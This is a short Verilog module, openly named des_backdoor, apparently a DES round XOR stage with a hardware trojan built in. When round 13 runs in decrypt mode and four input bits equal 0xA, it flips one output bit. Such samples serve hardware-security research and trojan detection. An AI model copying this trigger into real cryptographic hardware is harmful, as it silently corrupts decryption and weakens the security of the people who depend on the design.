module des_backdoor(
  input [31:0] Xin,
  input [31:0] out,
  input [3:0] roundSel,
  input decrypt,
  input [4:1] L,
  output [31:0] Rout
);
  assign Rout = Xin ^ out ^ {31'b0, (roundSel == 4'hd) & decrypt & (L[1:4] == 4'hA)};
endmodule
